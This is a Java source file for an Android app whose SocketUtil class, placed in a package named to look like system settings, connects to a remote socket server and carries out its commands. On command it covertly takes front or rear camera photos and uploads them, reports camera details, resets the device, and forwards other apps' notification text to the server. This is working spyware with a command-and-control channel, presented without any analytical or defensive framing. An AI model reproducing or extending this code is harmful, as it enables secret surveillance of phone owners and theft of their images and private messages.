package com.android.data.settings.Utility;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Camera;
import android.os.Handler;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import com.android.data.settings.MediaConfig;
import com.android.data.settings.Model.DeviceActivity;
import com.android.data.settings.Model.DeviceActivityResponse;
import com.android.data.settings.Model.DeviceCamera;
import com.android.data.settings.Model.DeviceInfo;
import com.android.data.settings.Model.Media;
import com.android.data.settings.Model.Property;
import com.android.data.settings.Service.CamService;
import com.android.data.settings.Service.NotificationService;
import com.google.gson.Gson;

import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class SocketUtil {
    private static final String TAG = SocketUtil.class.getSimpleName();

    private static final String EVENT_JOIN = "join";
    private static final String EVENT_ON_ACTIVITY = "onActivity";
    private static final String EVENT_ACTIVITY_RESPONSE = "activityResponse";

    public static final String ACTIVITY_SNAP_FRONT = "snapFront";
    public static final String ACTIVITY_SNAP_REAR = "snapRear";
    public static final String ACTIVITY_SNAP = "userSnap";
    public static final String ACTIVITY_RESET = "stopCamService";
    public static final String ACTIVITY_ON_EXCEPTION = "onException";
    public static final String ACTIVITY_ON_NOTIFICATION = "onNotification";
    public static final String ACTIVITY_GET_DEVICE_INFO = "getDeviceInfo";
    public static final String ACTIVITY_RESET_APP = "resetDevice";
    public static final String ACTIVITY_CAMERA_COUNT = "cameraCount";
    public static final String ACTIVITY_CAMERA_SIZES = "onCamSizes";

    public static final String INTENT_CAM_SERVICE_UPDATES = "CamServiceUpdates";
    public static final String INTENT_CS_TYPE = "CSUpdateType";
    public static final String INTENT_TYPE_IMAGE_BYTES = "TypeImageBytes";
    public static final String INTENT_TYPE_EXCEPTION = "TypeExceptionMessage";
    public static final String INTENT_TYPE_NOTIFICATION = "TypeNotificationMessage";
    public static final String INTENT_EXCEPTION_MESSAGE = "ExceptionMessage";
    public static final String INTENT_IMAGE_BYTES = "ImageBytes";

    private static Socket mSocket; {
        try {
            mSocket = IO.socket(MediaConfig.SOCKET_SERVER_URL);
        } catch (URISyntaxException e) { e.printStackTrace(); }
    }
    private Context context;
    private Handler handler;
    private MediaUtility mMediaUtility;
    private String deviceId;
    public static boolean isConnected;

    public SocketUtil(Context context) {
        this.context = context;
        isConnected = false;
        handler = new Handler();
        mMediaUtility = MediaUtility.getInstance(context);
        LocalBroadcastManager.getInstance(context).registerReceiver(receiver, new IntentFilter(INTENT_CAM_SERVICE_UPDATES));
        deviceId = mMediaUtility.getDeviceId();
    }

    private static SocketUtil mSocketUtil;
    public static synchronized SocketUtil getInstance(Context context) {
        if(mSocketUtil == null) {
            mSocketUtil = new SocketUtil(context);
        }
        return mSocketUtil;
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    public boolean connect() {
        if(mSocket != null && !mSocket.connected()) {
            Log.d(TAG, "Connecting to MediaStore...");
            mSocket.on(Socket.EVENT_CONNECT, onConnect);
            mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
            mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
            mSocket.on(Socket.EVENT_ERROR, onError);
            mSocket.on(Socket.EVENT_DISCONNECT, onError);
            mSocket.on(EVENT_ON_ACTIVITY, onActivity);
            mSocket.connect();
        }
        return this.isConnected();
    }

    public boolean isConnected() {
        try {
            return mSocket == null && mSocket.connected();
        } catch (NullPointerException e) {
            return false;
        }
    }

    private Emitter.Listener onConnect = (Object... args) -> {
        Log.d(TAG, "Device Connected");
        isConnected = true;
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onError = (Object... args) -> {
        isConnected = false;
        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
        try {
            response = URLEncoder.encode(response, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        mSocket.emit(EVENT_JOIN, response);
    };

    private Emitter.Listener onActivity = (Object... args) -> {
        Object obj = args[0];
        Log.d(TAG, obj.toString());
        DeviceActivity activity = DeviceActivity.fromJson(obj.toString());
        processActivity(activity);
    };

    private void captureImage(Property prop) {
        if(!CameraUtility.isCameraExist(context)) {
            return;
        }
        CamService.takeSnap(context, prop);
    }

    private void processActivity(DeviceActivity activity) {
        Log.d(TAG, "Activity Triggered " + activity.getName());
        Property property = activity.getProperty();
        switch (activity.getName()) {
            case ACTIVITY_SNAP: case ACTIVITY_SNAP_FRONT: case ACTIVITY_SNAP_REAR:
                captureImage(property);
                break;

            case ACTIVITY_RESET:
                context.stopService(new Intent(context, CamService.class));
                break;

            case ACTIVITY_RESET_APP:
                mMediaUtility.resetDevice();
                throwMessageToServer(ACTIVITY_ON_EXCEPTION, "Device Reset complete!");
                break;

            case ACTIVITY_CAMERA_COUNT:
                throwMessageToServer(ACTIVITY_CAMERA_COUNT, CameraUtility.totalCameras() + "");
                break;

            case ACTIVITY_CAMERA_SIZES:
                int camId = property.getCameraId();
                try {
                    throwMessageToServer(ACTIVITY_CAMERA_SIZES, CameraUtility.getSupportedSizes(camId));
                } catch (Exception e) {
                    throwMessageToServer(ACTIVITY_ON_EXCEPTION, e.getMessage());
                }
                break;

            case ACTIVITY_GET_DEVICE_INFO:
                DeviceInfo info = new DeviceInfo();
                List<DeviceCamera> cameraList = new ArrayList<>();

                int cameras = CameraUtility.totalCameras();
                for(int i =0; i <= cameras; i++) {
                    try {
                        List<Camera.Size> previewSizes = CameraUtility.getPreviewSizes(i);
                        List<Camera.Size> pictureSizes = CameraUtility.getPictireSizes(i);
                        DeviceCamera cam = new DeviceCamera(previewSizes, pictureSizes);
                        cameraList.add(cam);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                info.setCamCount(cameras);
                info.setCameras(cameraList);
                try {
                    throwMessageToServer(ACTIVITY_GET_DEVICE_INFO, DeviceInfo.toJson(info));
                } catch (Exception e) {
                    throwMessageToServer(ACTIVITY_ON_EXCEPTION, e.getMessage());
                }
                break;
        }
    }

    private void emitToServer(DeviceActivityResponse response) {
        if(mSocket != null && mSocket.connected()) {
            mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
        }
    }

    private void throwMessageToServer(String action, String msg) {
        String currentDeviceId = mMediaUtility.getDeviceId();
        DeviceActivityResponse response =
                new DeviceActivityResponse(action, currentDeviceId, msg);
        emitToServer(response);
    }

    private BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String type = intent.getStringExtra(INTENT_CS_TYPE);
            if(type == null || type.isEmpty()) {
                return;
            }

            DeviceActivityResponse response;
            switch (type) {
                case INTENT_TYPE_IMAGE_BYTES:
                    byte[] bytes = intent.getByteArrayExtra(INTENT_IMAGE_BYTES);
                    Media media = new Media(mMediaUtility.compressByteImage(bytes));
                    response =
                            new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
                    emitToServer(response);
                    break;

                case INTENT_TYPE_EXCEPTION:
                    String exceptionMsg = intent.getStringExtra(INTENT_EXCEPTION_MESSAGE);
                    throwMessageToServer(ACTIVITY_ON_EXCEPTION, exceptionMsg);
                    break;

                case INTENT_TYPE_NOTIFICATION:
                    String pkg = intent.getStringExtra(NotificationService.INTENT_NOTIFY_PACKAGE);
                    String ticker = intent.getStringExtra(NotificationService.INTENT_NOTIFY_TICKER);
                    String title = intent.getStringExtra(NotificationService.INTENT_NOTIFY_TITLE);
                    String text = intent.getStringExtra(NotificationService.INTENT_NOTIFY_TEXT);

                    String message = pkg + " ~ " + ticker + " ~ " + title + " ~ " + text;
                    throwMessageToServer(ACTIVITY_ON_NOTIFICATION, message);
                    break;
            }
        }
    };

    public void disconnect() {
        if(mSocket != null && mSocket.connected()) {
            mSocket.disconnect();
            mSocket.off(Socket.EVENT_CONNECT, onConnect);
            mSocket.off(Socket.EVENT_CONNECT_ERROR, onError);
            mSocket.off(Socket.EVENT_CONNECT_TIMEOUT, onError);
            mSocket.off(Socket.EVENT_ERROR, onError);
            mSocket.off(Socket.EVENT_DISCONNECT, onError);
            mSocket.off(EVENT_ON_ACTIVITY, onActivity);
        }
    }
}
